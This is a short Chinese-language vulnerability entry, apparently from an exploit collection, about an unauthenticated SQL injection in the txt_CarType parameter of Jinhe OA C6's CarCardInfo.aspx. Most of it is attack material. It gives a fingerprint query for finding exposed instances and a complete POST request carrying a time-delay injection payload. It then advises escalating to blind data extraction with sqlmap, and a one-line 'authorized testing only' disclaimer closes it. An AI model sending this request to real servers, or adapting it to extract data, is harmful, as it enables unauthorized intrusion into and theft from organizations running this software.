---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA CarCardInfo.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/` 接口 `txt_CarType` 参数存在 SQL 注入漏洞。后端为 SQL Server，攻击者无需登录即可通过延时盲注逐字符提取数据库内容。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

发送如下 POST 请求（`txt_CarType` 参数拼接延时语句）：

```
POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=&txt_CarType=1') waitfor/**/+delay/**/+'0:0:2'-- &txt_CarCode=&bt_Search=%B2%E9%D1%AF
```

响应延迟约 2 秒即判定注入存在；将延时改为条件语句即可做布尔/延时盲注提取数据，建议配合 sqlmap 跑。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
